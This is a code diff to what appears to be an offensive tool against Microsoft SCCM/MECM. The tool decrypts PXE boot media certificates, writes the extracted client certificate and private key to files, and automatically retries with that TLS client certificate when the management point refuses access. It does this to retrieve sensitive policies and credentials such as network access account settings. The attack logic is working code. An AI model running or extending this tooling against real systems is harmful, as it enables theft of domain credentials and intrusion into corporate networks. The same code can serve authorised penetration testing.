@@ -24,7 +24,7 @@ import zlib
 import datetime
 from os import walk,system
 from ipaddress import IPv4Network,IPv4Address
-from certipy.lib.certificate import load_pfx
+from certipy.lib.certificate import load_pfx,key_to_pem,cert_to_pem
 from sccmwtf import SCCMTools, Tools, CryptoTools, policyBody, msgHeaderPolicy, msgHeader, dateFormat1
 from cryptography.hazmat.primitives.asymmetric import padding
 import tftpy
@@ -545,6 +545,11 @@ def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     smsTSMediaPFX = binascii.unhexlify(cert_bytes)
     
     key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
+    print("[+] Loaded PFX, writing cert and key to a file in case of TLS")
+    with open(CERT_FILE, "w") as cert_file:
+        cert_file.write(cert_to_pem(cert).decode())
+    with open(KEY_FILE, "w") as key_file:
+        key_file.write(key_to_pem(key).decode())
     print('[+] Generating Client Authentication headers using PFX File...')
 
     data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
@@ -754,14 +759,13 @@ def analyse_task_sequence_for_potential_creds(ts_xml):
 
 #Retrieve all available TSs, the NAA config and any identified collection settings and return to parsing function
 def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key):
-
+    global USING_TLS
     #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     #print("[+] Retrieving Needed Metadata from SCCM Server...")
     sccm_base_url = SCCM_BASE_URL
     session = requests.Session()
     
     if USING_TLS:
-        session.verify = False
         session.cert = (CERT_FILE,KEY_FILE)
         #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
     if USING_PROXY:
@@ -773,6 +777,13 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
     print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
     sccm_base_url = sccm_base_url.split("*")[0]
     r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
+
+    if r.status_code == 403 and USING_TLS == False:
+        print("[-] MECM MP responded with: 403 - Forbidden")
+        print("[*] The server may require TLS with a client certificate.")
+        USING_TLS = True
+        print("[*] Retrying with enabled TLS")
+        return make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key)
 
     #Parse XML and retrieve x64UnknownMachineGUID
     root = ET.fromstring(r.text)
